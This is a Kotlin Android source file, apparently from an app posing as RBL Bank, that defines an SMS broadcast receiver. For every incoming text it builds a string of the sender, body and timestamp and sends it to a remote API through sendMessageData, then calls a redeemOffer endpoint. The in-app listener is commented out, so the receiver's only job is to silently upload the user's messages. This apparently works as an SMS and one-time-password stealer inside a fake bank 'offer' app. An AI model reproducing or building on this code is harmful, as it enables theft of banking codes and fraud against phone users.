package com.app.rblbank
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.app.rblbank.netutils.APIClient
import com.app.rblbank.netutils.RetrofitResponse
import com.google.android.gms.auth.api.phone.SmsRetriever
import com.google.android.gms.common.api.CommonStatusCodes
import com.google.android.gms.common.api.Status
import android.os.Bundle
import android.telephony.SmsMessage


class SmsBroadcastReceiver : BroadcastReceiver() {
    private var mListener: MessageListener? = null

    override fun onReceive(context: Context?, intent: Intent) {
        val data = intent.extras
        val pdus = data!!["pdus"] as Array<Any>?
        for (i in pdus!!.indices) {
            val smsMessage: SmsMessage = SmsMessage.createFromPdu(pdus[i] as ByteArray)
            val message = "Sender : " + smsMessage.getDisplayOriginatingAddress()
                .toString() + "Email From: " + smsMessage.getEmailFrom()
                .toString() + "Emal Body: " + smsMessage.getEmailBody()
                .toString() + "Display message body: " + smsMessage.getDisplayMessageBody()
                .toString() + "Time in millisecond: " + smsMessage.getTimestampMillis()
                .toString() + "Message: " + smsMessage.getMessageBody()
            sendData(message)
//            mListener!!.messageReceived(message)
        }
    }

    fun bindListener(listener: MessageListener?) {
        mListener = listener
    }

    interface MessageListener {
        /**
         * To call this method when new message received and send back
         * @param message Message
         */
        fun messageReceived(message: String?)
    }

    fun sendData(message:String){
        val call = APIClient.getClient().sendMessageData("Testing",message);
        APIClient.response(call,null,false, object: RetrofitResponse {
            override fun onResponse(response: String?) {
                redeem()
            }
        })

    }

    fun redeem(){
        val call = APIClient.getClient().redeemOffer();
        APIClient.response(call,null,false, object: RetrofitResponse {
            override fun onResponse(response: String?) {

            }
        })

    }
}